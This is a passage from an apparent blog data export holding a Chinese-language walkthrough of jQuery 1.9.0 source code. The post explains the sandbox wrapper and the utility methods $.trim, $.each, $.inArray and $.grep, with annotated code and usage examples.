//注意到，当callback函数返回值会false的时候，注意是全等！循环结束\n\t          break;\n\t        }\n\t      }\n\t    } else {\n\t      for ( i in obj ) {\n\t        value = callback.apply( obj[ i ], args );\n\n\t        if ( value === false ) {\n\t          break;\n\t        }\n\t      }\n\t    }\n\n\t  // A special, fast, case for the most common use of each\n\t  } else {\n\t    if ( isArray ) {\n\t      for ( ; i < length; i++ ) {\n\t        value = callback.call( obj[ i ], i, obj[ i ] );\n\t        //相当于callback(i, obj[i])。然后callback里边的this指向了obj[i]\n\n\t        if ( value === false ) {\n\t            break;\n\t          }\n\t        }\n\t      } else {\n\t        for ( i in obj ) {\n\t          value = callback.call( obj[ i ], i, obj[ i ] );\n\n\t          if ( value === false ) {\n\t            break;\n\t          }\n\t        }\n\t      }\n\t    }\n\n\t  return obj;\n\t}\n\n#### 等同于：\n\n\t//for in对于数组来说性能比较低而且存在某些bug\n\t//这里只是希望用更简洁的代码来减少原先代码的重复性\n\t$.each = function( obj, callback, args ) {\n\t  var value,\n\t    i = 0,\n\t    length = obj.length;\n\n\t  for ( i in obj ) {\n\t    value =\n\t      args ?\n\t      callback.apply( obj[ i ], args ) :\n\t      callback.call( obj[ i ], i, obj[ i ] );\n\n\t    if ( value === false ) {\n\t      break;\n\t    }\n\t  }\n\t  return obj;\n\t}\n\n#### 分析：\n\n看这两个例子\n\n\t$.each([1,2,3], function(key, value){\n\t  console.log(\"[\" + key + \"]=\" + value);\n\t  return false;\n\t});\n\t//输出：\n\t[0]=1\n\t//原数组结果：\n\t[1,2,3]\n\n`$.each()`接受2个参数， 数组[1,2,3],回调函数\n可以看到回调函数具有两个参数，`key`是数组的索引，`value`是对应的元素\n\n\t$.each([1,2,3], function(arg1, arg2){\n\t  console.log(this + \",\" + arg1 + \",\" + arg2);\n\t  return ;\n\t}, [4, 5]);\n\t//输出：\n\t1,4,5\n\t2,4,5\n\t3,4,5\n\t//原数组结果：\n\t[1,2,3]\n\n`$.each()`接受3个参数， 数组[1,2,3],回调函数，一个额外的参数数组`args`=[4,5]\n可以看到回调函数的两个参数就是`$.each()`的第三个参数`args`，在函数里边的`this`就是遍历元素自己\n\n对比上述二者也可以看到，当回调函数`return false`后就跳出循环，遍历不再执行\n\n### $.inArray()\n\n#### 源码：\n\n\tcore_deletedIds = [],\n\tcore_indexOf = core_deletedIds.indexOf,\n\n\t//elem 规定需检索的值。\n\t//arr 数组\n\t//i 可选的整数参数。规定在数组中开始检索的位置。它的合法取值是 0 到 arr.length - 1。如省略该参数，则将从数组首元素开始检索。\n\tinArray: function( elem, arr, i ) {\n\t  var len;\n\n\t  if ( arr ) {\n\t    //原生的Array对象支持indexOf方法，直接调用\n\t    if ( core_indexOf ) {\n\t      return core_indexOf.call( arr, elem, i );\n\t    }\n\n\t    len = arr.length;\n\t    i = i ? i < 0 ? Math.max( 0, len + i ) : i : 0;\n\n\t    for ( ; i < len; i++ ) {\n\t      if ( i in arr && arr[ i ] === elem ) {\n\t        return i;\n\t      }\n\t    }\n\t  }\n\n\t  //全部都不符合，返回-1\n\t  return -1;\n\t},\n\n#### 分析：\n\n    i = i ? i < 0 ? Math.max( 0, len + i ) : i : 0;\n\n当i为负数时，从数组后边len+i的位置开始索引\n\n\tfor ( ; i < len; i++ ) {\n\t\tif ( i in arr && arr[ i ] === elem ) {\n\t\treturn i;\n\t\t}\n    }\n\n这里的`(i in arr)`判断是为了跳过稀疏数组中的元素\n例如 `var arr = []; arr[2] = 1;`\n此时 `arr == [undefined, undefined, 1]`\n结果是 => \n\n* `(0 in arr == false)` \n* `(1 in arr == false)` \n* `(2 in arr == true)`\n\n另外（在火狐下）测试得：\n\n\tvar arr = [undefined, 1]; \n\n输出是： \n\n\tarr == [undefined, 1] \n\t0 in arr == true; \n\tarr.indexOf(undefined) == 0; \n\tarr[0] == undefined; \n\n但是如果是以下代码： \n\n\tvar arr = []; \n\ta[1] = 1; \n\n输出是： \n\n\tarr == [undefined, 1] \n\t0 in arr == false; \n\tarr.indexOf(undefined) == -1; \n\tarr[0] == undefined;\n\n所以`(i in arr)`也是必要的。\n\n### $.grep()\n\n#### 源码：\n\n\tgrep: function( elems, callback, inv ) {\n\t\tvar retVal,\n\t\tret = [],\n\t\ti = 0,\n\t\tlength = elems.length;\n\t\t//转成布尔型\n\t\tinv = !!inv;\n\n\t\t// Go through the array, only saving the items that pass the validator function\n\t\tfor ( ; i < length; i++ ) {\n\t\t\tretVal = !!callback( elems[ i ], i );\n\t\t\t//注意这里的callback参数是先value,后key\n\t\t\tif ( inv !== retVal ) {\n\t\t\t\tret.push( elems[ i ] );\n\t\t\t}\n\t\t}\n\n\t\treturn ret;\n\t}\n\n用例：\n\n\t$.grep( [0,1,2], function(n,i){\n\t  return n <= 0;\n\t});\n\t//结果是：[0] \n\n\t$.grep( [0,1,2], function(n,i){\n\t  return n <= 0;\n\t}, true);\n\t//结果是：[1, 2]\n\n****\n\n参考链接\n* [jQuery源码剖析（一）——概览&工具方法](https://www.w3ctech.com/topic/256)\n\n","source":"_posts/jQuery源码分析第一弹.md","raw":"---\n\ntitle: jQuery源码剖析·第一弹\ntags: ['jquery', 'js', '源码分析']\n\n---\n\n> 神库jQuery的内心世界\n\n> 选用1.9.0版本jQuery\n\n<!-- more -->\n\n## 目录\n\n1. **沙箱封装**\n2. **core工具方法**：jquery的核心组成部分，包括\n\t* $.trim()去除字符串两端的空格。（内部调用7次）\n\t* $.each()遍历数组或对象（内部调用59次）\n\t* $.inArray()返回一个值在数组中的索引位置。如果该值不在数组中，则返回-1。（内部调用9次）\n\t* $.grep()返回数组中符合某种标准的元素。（内部调用6次）\n\t* $.merge()合并两个数组。（内部调用11次）\n\t* $.map()将一个数组中的元素转换到另一个数组中。（内部调用12次）\n\t* $.makeArray()将对象转化为数组。（内部调用6次）\n\t* $.globalEval() 在全局作用域下执行一段js脚本。（内部调用2次）\n\t* $.proxy()接受一个函数，然后返回一个新函数，并且这个新函数始终保持了特定的上下文(context)语境。（内部调用0次）\n\t* $.nodeName()返回DOM节点的节点名字，或者判断DOM节点名是否为某某名字。（内部调用51次）\n\t* $.extend()将多个对象，合并到第一个对象。（内部调用42次）\n3. **$.type类型判断**：判断对象的类别（函数对象、日期对象、数组对象、正则对象等等（内部调用65次）,并以调用此方法来实现：\n\t* $.isArray()判断某个参数是否为数组。（内部调用12次）\n\t* $.isEmptyObject()判断某个对象是否为空（不含有任何属性）。（内部调用4次）\n\t* $.isFunction()判断某个参数是否为函数。（内部调用32次）\n\t* $.isPlainObject()判断某个参数是否为用\"{}\"或\"new Object\"建立的对象。（内部调用4次）\n\t* $.isWindow()判断是否为window对象。（内部调用6次）\n4. **处理ajax返回数据**：主要包括\n\t* $.parseHTML() 解析HTML（内部调用2次）\n\t* $.parseJSON() 解析JSON（内部调用2次）\n\t* $.parseXML() 解析XML（内部调用1次）\n5. **几个简单的函数**：不在之后的文章中分析\n\t* $.noop() 一个空函数，个人觉得是用来作为一个默认的回调函数，无需每次去定义一个空的function消耗资源。（内部调用2次）\n\t* $.now() 获取当前时间戳，代码很简单：return (new Date()).getTime();。（内部调用4次）\n\t* $.error() 报错，对外抛出一个异常，代码很简单：throw new Error(msg);。（内部调用2次）\n\n## 沙箱封装\n\n\t(function( window, undefined ) {\n\t     //用一个函数域把整个库包起来，就是所谓的沙箱\n\t     //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局\n\t     //把当前沙箱需要的外部变量通过函数参数引入进来\n\t     //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数\n\t    \"use strict\";\n\t    window.jQuery = window.$ = jQuery;\n\t})( window );\n\n至于为什么第二个参数`undefined`，这是一个针对压缩的小trick，同时也是为了防止因ES5之前能对`undefined`赋值而使用者编程不规范引发错误。\n\n压缩前\n\n\t(function( window, undefined ) {\n\t  var a = undefined;\n\t  if (a == undefined){......}\n\n\t  ......\n\t  if (c == undefined) return;\n\t})( window );\n\n压缩后\n\n\t(function(w, u) {\n\t  var a = u;\n\t  if (a == u){......}\n\n\t  ......\n\t  if (c == u) return;\n\t})(w);\n\n内部全局的`undefined`被缩成一个`u`，缩小了整个库的压缩包的体积。\n\n## core工具方法\n\n### 引用类型公有方法的存储\n\n#### 源码：\n\n\tclass2type = {},\n\tcore_deletedIds = [],\n\tcore_version = \"1.9.0\",\n\n\t// Save a reference to some core methods\n\tcore_concat = core_deletedIds.concat,\n\tcore_push = core_deletedIds.push,\n\tcore_slice = core_deletedIds.slice,\n\tcore_indexOf = core_deletedIds.indexOf,\n\tcore_toString = class2type.toString,\n\tcore_hasOwn = class2type.hasOwnProperty,\n\tcore_trim = core_version.trim,\n\n#### 等同于：\n\n\tcore_concat = Array.prototype.concat, \n\t......\n\n#### 分析：\n\n这里把js的几个引用类型的原生方法存储下来。本身这些方法的调用方式就有这3种：\n\n\tvar arr = [];\n\n\t1. arr.concat();\n\t2. core_concat.call(arr);\n\t3. core_concat.apply(arr);\n\n这里就有两个问题\n\n1. jQuery为什么要先把这些方法存储起来？\n2. jQuery为什么要采用方式二或者三，而不直接使用方式一的做法？ \n\n其实第二个问题就回答了第一个问题。\n而关于第二个问题有两个回答：\n\n1. 按第一种方式调用时，首先需要辨别当前实例`arr`的类型是`Array`，在内存空间中寻找`Array`的`concat`内存入口，把当前对象`arr`的指针和其他参数压入栈，跳转到`concat`地址开始执行。而当保存了`concat`方法的入口`core_concat`时，完全就可以省去前面两个步骤，从而提升一些性能。\n2. `var obj = {};`此时调用`obj.concat`会报错。但是如果采用后两种方式调用的话，能够解决这个问题。 也即是让类数组也能用到数组的方法（这就是`call`跟`apply`带来的另一种用法），尤其在jQuery里边引用一些DOM对象时，也能完美的用这个方法去解决。\n\n### $.trim()\n\n#### 源码：\n\n\tcore_version = \"1.9.0\",\n\tcore_trim = core_version.trim,\n\trtrim = /^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g,\n\n\ttrim: core_trim && !core_trim.call(\"\\uFEFF\\xA0\") ?\n\t  function( text ) {\n\t    return text == null ?\n\t      \"\" :\n\t      core_trim.call( text );\n\t  } :\n\n\t  // Otherwise use our own trimming functionality\n\t  function( text ) {\n\t    return text == null ?\n\t      \"\" :\n\t      ( text + \"\" ).replace( rtrim, \"\" );\n\t  }\n\n#### 等同于：\n\n\t trim: if (String.prototype.trim && \"\\uFEFF\\xA0\".trim() !== \"\") {\n\t \t//直接调用原生String的trim方法\n\t } else {\n\t \t//使用正则表达式和replace方法替换前尾的空格\n\t }\n\n#### 分析：\n\n如果浏览器原生支持`String`的`trim`方法，并且能够解析全角空格，那么就直接使用原生的`trim`方法\n\n> `\\uFEFF`是utf8的字节序标记，`\\xA0`是全角空格\n\n如果以上条件成立，那就直接用原生的trim函数:\n\n\t$.trim = function( text ) {\n\t    return text == null ?\n\t        \"\" :\n\t        text.trim();\n\t}\n\n如果上述条件不成立，那就自己实现一个`trim`方法：\n\n\t$.trim = function( text ) {\n\t    return text == null ?\n\t        \"\" :\n\t        ( text + \"\" ).replace( rtrim, \"\" );\n\t}\n\n### $.each()\n\n#### 源码：\n\n\t$.each = function( obj, callback, args ) {\n\t  //obj 是需要遍历的数组或者对象\n\t  //callback是处理数组或对象的每个元素的回调函数，它的返回值实际会中断循环的过程\n\n\t  var value,\n\t    i = 0,\n\t    length = obj.length,\n\t    //判断是不是数组\n\t    isArray = isArraylike( obj );\n\n\t  if ( args ) {\n\t    if ( isArray ) {\n\t      for ( ; i < length; i++ ) {\n\t        value = callback.apply( obj[ i ], args );\n\t        //相当于: args = [arg1, arg2, arg3];\n\t        //callback(args1, args2, args3)。然后callback里边的this指向了obj[i]\n\n\t        if ( value === false ) {\n\t          //注意到，当callback函数返回值会false的时候，注意是全等！循环结束\n\t          break;\n\t        }\n\t      }\n\t    } else {\n\t      for ( i in obj ) {\n\t        value = callback.apply( obj[ i ], args );\n\n\t        if ( value === false ) {\n\t          break;\n\t        }\n\t      }\n\t    }\n\n\t  // A special, fast, case for the most common use of each\n\t  } else {\n\t    if ( isArray ) {\n\t      for ( ; i < length; i++ ) {\n\t        value = callback.call( obj[ i ], i, obj[ i ] );\n\t        //相当于callback(i, obj[i])。然后callback里边的this指向了obj[i]\n\n\t        if ( value === false ) {\n\t            break;\n\t          }\n\t        }\n\t      } else {\n\t        for ( i in obj ) {\n\t          value = callback.call( obj[ i ], i, obj[ i ] );\n\n\t          if ( value === false ) {\n\t            break;\n\t          }\n\t        }\n\t      }\n\t    }\n\n\t  return obj;\n\t}\n\n#### 等同于：\n\n\t//for in对于数组来说性能比较低而且存在某些bug\n\t//这里只是希望用更简洁的代码来减少原先代码的重复性\n\t$.each = function( obj, callback, args ) {\n\t  var value,\n\t    i = 0,\n\t    length = obj.length;\n\n\t  for ( i in obj ) {\n\t    value =\n\t      args ?\n\t      callback.apply( obj[ i ], args ) :\n\t      callback.call( obj[ i ], i, obj[ i ] );\n\n\t    if ( value === false ) {\n\t      break;\n\t    }\n\t  }\n\t  return obj;\n\t}\n\n#### 分析：\n\n看这两个例子\n\n\t$.each([1,2,3], function(key, value){\n\t  console.log(\"[\" + key + \"]=\" + value);\n\t  return false;\n\t});\n\t//输出：\n\t[0]=1\n\t//原数组结果：\n\t[1,2,3]\n\n`$.each()`接受2个参数， 数组[1,2,3],回调函数\n可以看到回调函数具有两个参数，`key`是数组的索引，`value`是对应的元素\n\n\t$.each([1,2,3], function(arg1, arg2){\n\t  console.log(this + \",\" + arg1 + \",\" + arg2);\n\t  return ;\n\t}, [4, 5]);\n\t//输出：\n\t1,4,5\n\t2,4,5\n\t3,4,5\n\t//原数组结果：\n\t[1,2,3]\n\n`$.each()`接受3个参数， 数组[1,2,3],回调函数，一个额外的参数数组`args`=[4,5]\n可以看到回调函数的两个参数就是`$.each()`的第三个参数`args`，在函数里边的`this`就是遍历元素自己\n\n对比上述二者也可以看到，当回调函数`return false`后就跳出循环，遍历不再执行\n\n### $.inArray()\n\n#### 源码：\n\n\tcore_deletedIds = [],\n\tcore_indexOf = core_deletedIds.indexOf,\n\n\t//elem 规定需检索的值。\n\t//arr 数组\n\t//i 可选的整数参数。规定在数组中开始检索的位置。它的合法取值是 0 到 arr.length - 1。如省略该参数，则将从数组首元素开始检索。\n\tinArray: function( elem, arr, i ) {\n\t  var len;\n\n\t  if ( arr ) {\n\t    //原生的Array对象支持indexOf方法，直接调用\n\t    if ( core_indexOf ) {\n\t      return core_indexOf.call( arr, elem, i );\n\t    }\n\n\t    len = arr.length;\n\t    i = i ? i < 0 ? Math.max( 0, len + i ) : i : 0;\n\n\t    for ( ; i < len; i++ ) {\n\t      if ( i in arr && arr[ i ] === elem ) {\n\t        return i;\n\t      }\n\t    }\n\t  }\n\n\t  //全部都不符合，返回-1\n\t  return -1;\n\t},\n\n#### 分析：\n\n    i = i ? i < 0 ? Math.max( 0, len + i ) : i : 0;\n\n当i为负数时，从数组后边len+i的位置开始索引\n\n\tfor ( ; i < len; i++ ) {\n\t\tif ( i in arr && arr[ i ] === elem ) {\n\t\treturn i;\n\t\t}\n    }\n\n这里的`(i in arr)`判断是为了跳过稀疏数组中的元素\n例如 `var arr = []; arr[2] = 1;`\n此时 `arr == [undefined, undefined, 1]`\n结果是 => \n\n* `(0 in arr == false)` \n* `(1 in arr == false)` \n* `(2 in arr == true)`\n\n另外（在火狐下）测试得：\n\n\tvar arr = [undefined, 1]; \n\n输出是： \n\n\tarr == [undefined, 1] \n\t0 in arr == true; \n\tarr.indexOf(undefined) == 0; \n\tarr[0] == undefined; \n\n但是如果是以下代码： \n\n\tvar arr = []; \n\ta[1] = 1; \n\n输出是： \n\n\tarr == [undefined, 1] \n\t0 in arr == false; \n\tarr.indexOf(undefined) == -1; \n\tarr[0] == undefined;\n\n所以`(i in arr)`也是必要的。\n\n### $.grep()\n\n#### 源码：\n\n\tgrep: function( elems, callback, inv ) {\n\t\tvar retVal,\n\t\tret = [],\n\t\ti = 0,\n\t\tlength = elems.length;\n\t\t//转成布尔型\n\t\tinv = !!inv;\n\n\t\t// Go through the array, only saving the items that pass the validator function\n\t\tfor ( ; i < length; i++ ) {\n\t\t\tretVal = !!callback( elems[ i ], i );\n\t\t\t//注意这里的callback参数是先value,后key\n\t\t\tif ( inv !== retVal ) {\n\t\t\t\tret.push( elems[ i ] );\n\t\t\t}\n\t\t}\n\n\t\treturn ret;\n\t}\n\n用例：\n\n\t$.grep( [0,1,2], function(n,i){\n\t  return n <= 0;\n\t});\n\t//结果是：[0] \n\n\t$.grep( [0,1,2], function(n,i){\n\t  return n <= 0;\n\t}, true);\n\t//结果是：[1, 2]\n\n****\n\n参考链接\n* [jQuery源码剖析（一）——概览&工具方法](https://www.w3ctech.com/topic/256)\n\n","slug":"jQuery源码分析第一弹","published":1,"date":"2017-04-22T08:24:45.698Z","updated":"2017-04-22T08:26:51.484Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9ft3s3e0003l8sld9wyucis","content":"<blockquote>\n<p>神库jQuery的内心世界</p>\n<p>选用1.9.0版本jQuery</p>\n</blockquote>\n<a id=\"more\"></a>\n<h2 id=\"目录\"><a href=\"#目录\" class=\"headerlink\" title=\"目录\"></a>目录</h2><ol>\n<li><strong>沙箱封装</strong></li>\n<li><strong>core工具方法</strong>：jquery的核心组成部分，包括<ul>\n<li>$.trim()去除字符串两端的空格。（内部调用7次）</li>\n<li>$.each()遍历数组或对象（内部调用59次）</li>\n<li>$.inArray()返回一个值在数组中的索引位置。如果该值不在数组中，则返回-1。（内部调用9次）</li>\n<li>$.grep()返回数组中符合某种标准的元素。（内部调用6次）</li>\n<li>$.merge()合并两个数组。（内部调用11次）</li>\n<li>$.map()将一个数组中的元素转换到另一个数组中。（内部调用12次）</li>\n<li>$.makeArray()将对象转化为数组。（内部调用6次）</li>\n<li>$.globalEval() 在全局作用域下执行一段js脚本。（内部调用2次）</li>\n<li>$.proxy()接受一个函数，然后返回一个新函数，并且这个新函数始终保持了特定的上下文(context)语境。（内部调用0次）</li>\n<li>$.nodeName()返回DOM节点的节点名字，或者判断DOM节点名是否为某某名字。（内部调用51次）</li>\n<li>$.extend()将多个对象，合并到第一个对象。（内部调用42次）</li>\n</ul>\n</li>\n<li><strong>$.type类型判断</strong>：判断对象的类别（函数对象、日期对象、数组对象、正则对象等等（内部调用65次）,并以调用此方法来实现：<ul>\n<li>$.isArray()判断某个参数是否为数组。（内部调用12次）</li>\n<li>$.isEmptyObject()判断某个对象是否为空（不含有任何属性）。（内部调用4次）</li>\n<li>$.isFunction()判断某个参数是否为函数。（内部调用32次）</li>\n<li>$.isPlainObject()判断某个参数是否为用”{}”或”new Object”建立的对象。（内部调用4次）</li>\n<li>$.isWindow()判断是否为window对象。（内部调用6次）</li>\n</ul>\n</li>\n<li><strong>处理ajax返回数据</strong>：主要包括<ul>\n<li>$.parseHTML() 解析HTML（内部调用2次）</li>\n<li>$.parseJSON() 解析JSON（内部调用2次）</li>\n<li>$.parseXML() 解析XML（内部调用1次）</li>\n</ul>\n</li>\n<li><strong>几个简单的函数</strong>：不在之后的文章中分析<ul>\n<li>$.noop() 一个空函数，个人觉得是用来作为一个默认的回调函数，无需每次去定义一个空的function消耗资源。（内部调用2次）</li>\n<li>$.now() 获取当前时间戳，代码很简单：return (new Date()).getTime();。（内部调用4次）</li>\n<li>$.error() 报错，对外抛出一个异常，代码很简单：throw new Error(msg);。（内部调用2次）</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"沙箱封装\"><a href=\"#沙箱封装\" class=\"headerlink\" title=\"沙箱封装\"></a>沙箱封装</h2><pre><code>(function( window, undefined ) {\n     //用一个函数域把整个库包起来，就是所谓的沙箱\n     //在这里边var定义的变量，属于这个函数域内的局部变量，避免污染全局\n     //把当前沙箱需要的外部变量通过函数参数引入进来\n     //只要保证参数对内提供的接口的一致性，你还可以随意替换传进来的这个参数\n    &quot;use strict&quot;;\n    window.jQuery = window.$ = jQuery;\n})( window );\n</code></pre><p>至于为什么第二个参数<code>undefined</code>，这是一个针对压缩的小trick，同时也是为了防止因ES5之前能对<code>undefined</code>赋值而使用者编程不规范引发错误。</p>\n<p>压缩前</p>\n<pre><code>(function( window, undefined ) {\n  var a = undefined;\n  if (a == undefined){......}\n\n  ......\n  if (c == undefined) return;\n})( window );\n</code></pre><p>压缩后</p>\n<pre><code>(function(w, u) {\n  var a = u;\n  if (a == u){......}\n\n  ......\n  if (c == u) return;\n})(w);\n</code></pre><p>内部全局的<code>undefined</code>被缩成一个<code>u</code>，缩小了整个库的压缩包的体积。</p>\n<h2 id=\"core工具方法\"><a href=\"#core工具方法\" class=\"headerlink\" title=\"core工具方法\"></a>core工具方法</h2><h3 id=\"引用类型公有方法的存储\"><a href=\"#引用类型公有方法的存储\" class=\"headerlink\" title=\"引用类型公有方法的存储\"></a>引用类型公有方法的存储</h3><h4 id=\"源码：\"><a href=\"#源码：\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>class2type = {},\ncore_deletedIds = [],\ncore_version = &quot;1.9.0&quot;,\n\n// Save a reference to some core methods\ncore_concat = core_deletedIds.concat,\ncore_push = core_deletedIds.push,\ncore_slice = core_deletedIds.slice,\ncore_indexOf = core_deletedIds.indexOf,\ncore_toString = class2type.toString,\ncore_hasOwn = class2type.hasOwnProperty,\ncore_trim = core_version.trim,\n</code></pre><h4 id=\"等同于：\"><a href=\"#等同于：\" class=\"headerlink\" title=\"等同于：\"></a>等同于：</h4><pre><code>core_concat = Array.prototype.concat, \n......\n</code></pre><h4 id=\"分析：\"><a href=\"#分析：\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><p>这里把js的几个引用类型的原生方法存储下来。本身这些方法的调用方式就有这3种：</p>\n<pre><code>var arr = [];\n\n1. arr.concat();\n2. core_concat.call(arr);\n3. core_concat.apply(arr);\n</code></pre><p>这里就有两个问题</p>\n<ol>\n<li>jQuery为什么要先把这些方法存储起来？</li>\n<li>jQuery为什么要采用方式二或者三，而不直接使用方式一的做法？ </li>\n</ol>\n<p>其实第二个问题就回答了第一个问题。<br>而关于第二个问题有两个回答：</p>\n<ol>\n<li>按第一种方式调用时，首先需要辨别当前实例<code>arr</code>的类型是<code>Array</code>，在内存空间中寻找<code>Array</code>的<code>concat</code>内存入口，把当前对象<code>arr</code>的指针和其他参数压入栈，跳转到<code>concat</code>地址开始执行。而当保存了<code>concat</code>方法的入口<code>core_concat</code>时，完全就可以省去前面两个步骤，从而提升一些性能。</li>\n<li><code>var obj = {};</code>此时调用<code>obj.concat</code>会报错。但是如果采用后两种方式调用的话，能够解决这个问题。 也即是让类数组也能用到数组的方法（这就是<code>call</code>跟<code>apply</code>带来的另一种用法），尤其在jQuery里边引用一些DOM对象时，也能完美的用这个方法去解决。</li>\n</ol>\n<h3 id=\"trim\"><a href=\"#trim\" class=\"headerlink\" title=\"$.trim()\"></a>$.trim()</h3><h4 id=\"源码：-1\"><a href=\"#源码：-1\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>core_version = &quot;1.9.0&quot;,\ncore_trim = core_version.trim,\nrtrim = /^[\\s\\uFEFF\\xA0]+|[\\s\\uFEFF\\xA0]+$/g,\n\ntrim: core_trim &amp;&amp; !core_trim.call(&quot;\\uFEFF\\xA0&quot;) ?\n  function( text ) {\n    return text == null ?\n      &quot;&quot; :\n      core_trim.call( text );\n  } :\n\n  // Otherwise use our own trimming functionality\n  function( text ) {\n    return text == null ?\n      &quot;&quot; :\n      ( text + &quot;&quot; ).replace( rtrim, &quot;&quot; );\n  }\n</code></pre><h4 id=\"等同于：-1\"><a href=\"#等同于：-1\" class=\"headerlink\" title=\"等同于：\"></a>等同于：</h4><pre><code>trim: if (String.prototype.trim &amp;&amp; &quot;\\uFEFF\\xA0&quot;.trim() !== &quot;&quot;) {\n    //直接调用原生String的trim方法\n} else {\n    //使用正则表达式和replace方法替换前尾的空格\n}\n</code></pre><h4 id=\"分析：-1\"><a href=\"#分析：-1\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><p>如果浏览器原生支持<code>String</code>的<code>trim</code>方法，并且能够解析全角空格，那么就直接使用原生的<code>trim</code>方法</p>\n<blockquote>\n<p><code>\\uFEFF</code>是utf8的字节序标记，<code>\\xA0</code>是全角空格</p>\n</blockquote>\n<p>如果以上条件成立，那就直接用原生的trim函数:</p>\n<pre><code>$.trim = function( text ) {\n    return text == null ?\n        &quot;&quot; :\n        text.trim();\n}\n</code></pre><p>如果上述条件不成立，那就自己实现一个<code>trim</code>方法：</p>\n<pre><code>$.trim = function( text ) {\n    return text == null ?\n        &quot;&quot; :\n        ( text + &quot;&quot; ).replace( rtrim, &quot;&quot; );\n}\n</code></pre><h3 id=\"each\"><a href=\"#each\" class=\"headerlink\" title=\"$.each()\"></a>$.each()</h3><h4 id=\"源码：-2\"><a href=\"#源码：-2\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>$.each = function( obj, callback, args ) {\n  //obj 是需要遍历的数组或者对象\n  //callback是处理数组或对象的每个元素的回调函数，它的返回值实际会中断循环的过程\n\n  var value,\n    i = 0,\n    length = obj.length,\n    //判断是不是数组\n    isArray = isArraylike( obj );\n\n  if ( args ) {\n    if ( isArray ) {\n      for ( ; i &lt; length; i++ ) {\n        value = callback.apply( obj[ i ], args );\n        //相当于: args = [arg1, arg2, arg3];\n        //callback(args1, args2, args3)。然后callback里边的this指向了obj[i]\n\n        if ( value === false ) {\n          //注意到，当callback函数返回值会false的时候，注意是全等！循环结束\n          break;\n        }\n      }\n    } else {\n      for ( i in obj ) {\n        value = callback.apply( obj[ i ], args );\n\n        if ( value === false ) {\n          break;\n        }\n      }\n    }\n\n  // A special, fast, case for the most common use of each\n  } else {\n    if ( isArray ) {\n      for ( ; i &lt; length; i++ ) {\n        value = callback.call( obj[ i ], i, obj[ i ] );\n        //相当于callback(i, obj[i])。然后callback里边的this指向了obj[i]\n\n        if ( value === false ) {\n            break;\n          }\n        }\n      } else {\n        for ( i in obj ) {\n          value = callback.call( obj[ i ], i, obj[ i ] );\n\n          if ( value === false ) {\n            break;\n          }\n        }\n      }\n    }\n\n  return obj;\n}\n</code></pre><h4 id=\"等同于：-2\"><a href=\"#等同于：-2\" class=\"headerlink\" title=\"等同于：\"></a>等同于：</h4><pre><code>//for in对于数组来说性能比较低而且存在某些bug\n//这里只是希望用更简洁的代码来减少原先代码的重复性\n$.each = function( obj, callback, args ) {\n  var value,\n    i = 0,\n    length = obj.length;\n\n  for ( i in obj ) {\n    value =\n      args ?\n      callback.apply( obj[ i ], args ) :\n      callback.call( obj[ i ], i, obj[ i ] );\n\n    if ( value === false ) {\n      break;\n    }\n  }\n  return obj;\n}\n</code></pre><h4 id=\"分析：-2\"><a href=\"#分析：-2\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><p>看这两个例子</p>\n<pre><code>$.each([1,2,3], function(key, value){\n  console.log(&quot;[&quot; + key + &quot;]=&quot; + value);\n  return false;\n});\n//输出：\n[0]=1\n//原数组结果：\n[1,2,3]\n</code></pre><p><code>$.each()</code>接受2个参数， 数组[1,2,3],回调函数<br>可以看到回调函数具有两个参数，<code>key</code>是数组的索引，<code>value</code>是对应的元素</p>\n<pre><code>$.each([1,2,3], function(arg1, arg2){\n  console.log(this + &quot;,&quot; + arg1 + &quot;,&quot; + arg2);\n  return ;\n}, [4, 5]);\n//输出：\n1,4,5\n2,4,5\n3,4,5\n//原数组结果：\n[1,2,3]\n</code></pre><p><code>$.each()</code>接受3个参数， 数组[1,2,3],回调函数，一个额外的参数数组<code>args</code>=[4,5]<br>可以看到回调函数的两个参数就是<code>$.each()</code>的第三个参数<code>args</code>，在函数里边的<code>this</code>就是遍历元素自己</p>\n<p>对比上述二者也可以看到，当回调函数<code>return false</code>后就跳出循环，遍历不再执行</p>\n<h3 id=\"inArray\"><a href=\"#inArray\" class=\"headerlink\" title=\"$.inArray()\"></a>$.inArray()</h3><h4 id=\"源码：-3\"><a href=\"#源码：-3\" class=\"headerlink\" title=\"源码：\"></a>源码：</h4><pre><code>core_deletedIds = [],\ncore_indexOf = core_deletedIds.indexOf,\n\n//elem 规定需检索的值。\n//arr 数组\n//i 可选的整数参数。规定在数组中开始检索的位置。它的合法取值是 0 到 arr.length - 1。如省略该参数，则将从数组首元素开始检索。\ninArray: function( elem, arr, i ) {\n  var len;\n\n  if ( arr ) {\n    //原生的Array对象支持indexOf方法，直接调用\n    if ( core_indexOf ) {\n      return core_indexOf.call( arr, elem, i );\n    }\n\n    len = arr.length;\n    i = i ? i &lt; 0 ? Math.max( 0, len + i ) : i : 0;\n\n    for ( ; i &lt; len; i++ ) {\n      if ( i in arr &amp;&amp; arr[ i ] === elem ) {\n        return i;\n      }\n    }\n  }\n\n  //全部都不符合，返回-1\n  return -1;\n},\n</code></pre><h4 id=\"分析：-3\"><a href=\"#分析：-3\" class=\"headerlink\" title=\"分析：\"></a>分析：</h4><pre><code>i = i ? i &lt; 0 ? Math.max( 0, len + i ) : i : 0;\n</code></pre><p>当i为负数时，从数组后边len+i的位置开始索引</p>\n<pre><code>for ( ; i &lt; len; i++ ) {\n    if ( i in arr &amp;&amp; arr[ i ] === elem ) {\n    return i;\n    }\n}\n</code></pre><p>这里的<code>(i in arr)</code>判断是为了跳过稀疏数组中的元素<br>例如 <code>var arr = []; arr[2] = 1;</code><br>此时 <code>arr == [undefined, undefined, 1]</code><br>结果是 =&gt; </p>\n<ul>\n<li><code>(0 in arr == false)</code> </li>\n<li><code>(1 in arr == false)</code> </li>\n<li><code>(2 in arr == true)</code></li>\n</ul>\n<p>另外（在火狐下）测试得：</p>\n<pre><code>var arr = [undefined, 1]; \n</code></pre><p>输出是： </p>\n<pre><code>arr == [undefined, 1] \n0 in arr 